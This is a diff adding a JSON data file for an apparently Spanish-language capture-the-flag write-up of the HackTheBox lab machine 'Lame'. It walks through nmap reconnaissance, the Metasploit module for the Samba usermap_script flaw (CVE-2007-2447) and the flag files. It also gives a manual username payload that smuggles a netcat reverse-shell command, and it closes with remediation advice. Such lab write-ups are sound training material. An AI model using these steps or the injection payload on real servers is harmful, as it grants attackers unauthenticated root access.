@@ -1,0 +1,29 @@
+{
+  "name": "Lame",
+  "ip": "10.10.10.3",
+  "os": "Linux",
+  "diff": "Easy",
+  "plat": "HackTheBox",
+  "date": "2026-10-03",
+  "desc": "Samba 3.0.20 vulnerable a usermap_script: ejecución de comandos como root sin autenticación.",
+  "tags": "#linux #smb #samba #cve-2007-2447 #metasploit",
+  "url": "https://labs.hackthebox.com/achievement/machine/2772097/1",
+  "accent": "0 214 170",
+  "sections": {
+    "resumen": "Lame es la típica de \"primera máquina\": un <b>Samba</b> antiguo expuesto a Internet con una vulnerabilidad de ejecución de comandos que, encima, entra directamente como <bo>root.</bo> Ni escalada ni pivoting, puro clásico de 2007.",
+    "vulnerabilidad": "<br>CVE-2007-2447 (Samba usermap_script)</br>\n\nAfecta a <b>Samba</b> 3.0.20 a 3.0.25rc3 cuando está activado <ba>username map script.</ba> El nombre de usuario que se envía en la autenticación se pasa sin sanear a un shell, así que metiendo metacaracteres en el campo de usuario se ejecutan comandos arbitrarios. Como el servicio corre como <bo>root,</bo> el código se ejecuta con ese privilegio sin necesidad de credenciales.",
+    "reconocimiento": "Búsqueda de puertos abiertos en la máquina víctima\n\n```term\n$ sudo nmap -p- -Pn -sS -n --max-retries 1 <b>lame</b>\n```\n\n```table\n{\"corners\": \"round\", \"cells\": [[{\"t\": \"Puerto\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}, {\"t\": \"Servicio\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}, {\"t\": \"Versión\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}], [{\"t\": \"21\", \"a\": \"l\"}, {\"t\": \"ftp\", \"a\": \"l\"}, {\"t\": \"vsftpd 2.3.4\", \"a\": \"l\"}], [{\"t\": \"22\", \"a\": \"l\"}, {\"t\": \"ssh\", \"a\": \"l\"}, {\"t\": \"OpenSSH 4.7p1\", \"a\": \"l\"}], [{\"t\": \"139\", \"a\": \"l\"}, {\"t\": \"netbios-ssn\", \"a\": \"l\"}, {\"t\": \"Samba smbd 3.x\", \"a\": \"l\"}], [{\"t\": \"445\", \"a\": \"l\"}, {\"t\": \"netbios-ssn\", \"a\": \"l\"}, {\"t\": \"Samba smbd 3.0.20\", \"a\": \"l\"}], [{\"t\": \"3632\", \"a\": \"l\"}, {\"t\": \"distccd\", \"a\": \"l\"}, {\"t\": \"distccd v1\", \"a\": \"l\"}]], \"v\": [{\"on\": true, \"color\": \"#243244\", \"w\": 1}, {\"on\": false}, {\"on\": false}, {\"on\": true, \"color\": \"#243244\", \"w\": 1}], \"h\": [{\"on\": true, \"color\": \"#243244\", \"w\": 1}, {\"on\": true, \"color\": \"page\", \"w\": 3}, {\"on\": false}, {\"on\": false}, {\"on\": false}, {\"on\": false}, {\"on\": true, \"color\": \"#243244\", \"w\": 1}]}\n```\n\nVarios servicios antiguos. El <b>445</b> delata un <b>Samba 3.0.20,</b> versión con una vulnerabilidad pública muy conocida.",
+    "enumeracion": "Confirmamos la versión del servicio SMB, que es lo que marca el camino\n\n```term\n$ sudo nmap -p139,445 -sCV <b>lame</b>\n<bw>Samba smbd 3.0.20-Debian</bw>\n```\n\nLa versión <b>3.0.20</b> es vulnerable a <br>CVE-2007-2447.</br> El FTP (vsftpd 2.3.4) y el distccd son otras vías posibles, pero la de Samba es la más limpia porque da <bo>root</bo> directo.",
+    "explotacion": "Usamos el módulo de Metasploit del username map script\n\n```term\nmsf6 > use exploit/multi/samba/usermap_script\nmsf6 > set RHOSTS lame\nmsf6 > set LHOST tun0\nmsf6 > run\n```\n\nEl exploit inyecta un comando en el campo de usuario de la autenticación SMB. Como <b>smbd</b> corre como <bo>root,</bo> la shell entra directamente con ese privilegio\n\n```term\n# id\n<bw>uid=0(root) gid=0(root)</bw>\n```\n\nTambién se puede hacer a mano con <b>smbclient,</b> poniendo como usuario algo como <ba>\"/=`nohup nc -e /bin/sh ...`\"</ba> para disparar la inyección.",
+    "flags": "```term\n$ cat /home/makis/user.txt\n```\n\n```term\n$ cat /root/root.txt\n```",
+    "arreglo": "Todo parte de un servicio obsoleto y mal configurado, así que el arreglo va por capas:\n\n- <bw>Actualizar Samba:</bw> cualquier versión igual o posterior a 3.0.25 corrige la inyección del username map script. Es la solución de fondo.\n- <bw>Desactivar username map script:</bw> si no se necesita, esa opción del smb.conf no debería estar activa, ya que es la que permite la ejecución.\n- <bw>No exponer SMB a Internet:</bw> los puertos 139/445 deben quedar en la red interna o filtrados en el cortafuegos.\n- <bw>Menor privilegio:</bw> evitar ejecutar servicios de red como root siempre que la plataforma lo permita.",
+    "conclusiones": "Un <b>Samba</b> de 2007 expuesto es una invitación: la vulnerabilidad es pública, fiable y da <bo>root</bo> sin credenciales.\n\nAnte el puerto 445, identificar la versión exacta con <b>nmap -sCV</b> es lo que decide el vector; aquí la versión 3.0.20 canta por sí sola.\n\nLame recuerda que lo más peligroso no suele ser una técnica sofisticada, sino un servicio viejo sin parchear al alcance de cualquiera."
+  },
+  "img": {
+    "avatar": "/assets/img/machines/lame.png",
+    "banner": "/assets/img/machines/lame-banner.png",
+    "proof": "https://labs.hackthebox.com/achievement/machine/2772097/1"
+  },
+  "status": "Resuelta",
+  "updated": "2026-10-03"
+}
